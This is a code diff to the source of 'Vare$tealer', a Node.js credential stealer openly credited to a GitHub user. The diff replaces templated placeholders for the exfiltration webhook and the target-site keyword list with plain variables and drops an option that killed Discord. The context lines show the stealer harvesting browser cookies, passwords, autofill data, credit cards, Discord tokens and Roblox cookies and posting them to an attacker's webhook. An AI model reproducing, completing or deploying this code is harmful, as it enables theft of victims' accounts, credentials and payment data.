@@ -15,11 +15,8 @@ const exec = childProcess.exec;
 const hideconsole = require('node-hide-console-window');
 const buf_replace = require('buffer-replace');
 
-let killdcop = false; 
-
-
-const %webhookstring% = "REPLACE_YOUR_WEBHOOK";
-const %keywordstring% = ['github.com','gmail.com','twitch.tv','instagram.com'];
+const webhookstring = "REPLACE_YOUR_WEBHOOK";
+const keywordstring = ['github.com','gmail.com','twitch.tv','instagram.com'];
 
 
 const hwid = execSync('WMIC csproduct get UUID').toString().trim().split('\n')[1];
@@ -270,7 +267,7 @@ async function %VAREINSTA%(cookie) {
       }
     ],
 }));
-  axios.post(%webhookstring%,lllllllll,{headers:{...lllllllll.getHeaders()}});
+  axios.post(webhookstring,lllllllll,{headers:{...lllllllll.getHeaders()}});
 }
 
 async function %SENDLOGS%() {
@@ -349,7 +346,7 @@ async function %SENDLOGS%() {
         ]
       }));
       lllllllll.append('atc', `${autofillCount}`);lllllllll.append('p', `${passwordCount}`);lllllllll.append('c', `${cookieCount}`);lllllllll.append('cc', `${ccCount}`);lllllllll.append('ip', `${ip}`);lllllllll.append('host', `${os.hostname}`);lllllllll.append('user', `${username}`);
-    axios.post(%webhookstring%, llllllll, {
+    axios.post(webhookstring, llllllll, {
       headers: {
         ...llllllll.getHeaders()
       }
@@ -445,7 +442,7 @@ async function %SENDROBLOX%(secret_cookie) {
       let embed=await %GETEMBED%(),data=await %GETROBLOX%(secret_cookie);
       const lllllll=new FormData;
       lllllll.append("payload_json",JSON.stringify({username:"Vare$tealer - https://github.com/saintdaddy",avatar_url:embed.avatar,embeds:[{color:3092790,fields:[{name:"Username",value:`\`${data.username}\``,inline:!0},{name:"Robux",value:`\`${data.robux}\``,inline:!0},{name:"Premium",value:`\`${data.premium?"✅":"❌"}\``,inline:!0},{name:"Cookie",value:`\`\`\`${secret_cookie}\`\`\``}],author:{name:`${data.username} | ${data.id}`,icon_url:data.avatar},footer:{text:`Vare$tealer - ${embed.url} - ${os.hostname}`,icon_url:embed.footericon}}]}));
-      axios.post(%webhookstring%,lllllll,{headers:{...lllllll.getHeaders()}});
+      axios.post(webhookstring,lllllll,{headers:{...lllllll.getHeaders()}});
 }
 
 function %PCNAME%() {
@@ -817,7 +814,7 @@ async function %VARESTEALTOKEN%() {
         let embed = await %GETEMBED%()
         var pp = `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
         var servers = await %VARESERVERS%(token)
-        axios.post(%webhookstring%, {
+        axios.post(webhookstring, {
             username: "Vare$tealer - https://github.com/saintdaddy",
             avatar_url: embed.avatar,
             embeds: [{
@@ -1244,7 +1241,7 @@ async function %VAREALLCOOKIES%() {
       let path = cookiepaths[browser];
       let cookies = await %VARECOOKIES%(path);
       if (cookies && cookies != '~|~|~ VARE$TEALER ~|~|~ \n') {
-        %keywordstring%.forEach((keyword) => {
+        keywordstring.forEach((keyword) => {
           if (cookies.includes(keyword)) {
             if (!founds[browser]) {
               founds[browser] = [];
@@ -1252,7 +1249,7 @@ async function %VAREALLCOOKIES%() {
             founds[browser].push(keyword);
           }
         });
-        %keywordstring%.forEach((keyword) => {
+        keywordstring.forEach((keyword) => {
           if (cookies.includes(keyword)) {
             if (!all_founds) {
               all_founds = [];
@@ -1414,8 +1411,6 @@ async function %DISCORDINJ%() {
       await %FINDINJ%(paths)
   }
   await %BETTERBROKE%();
-  if (killdcop)
-  await %KILLDC%();
 }
 
 async function %VARECHECKSTART%() {
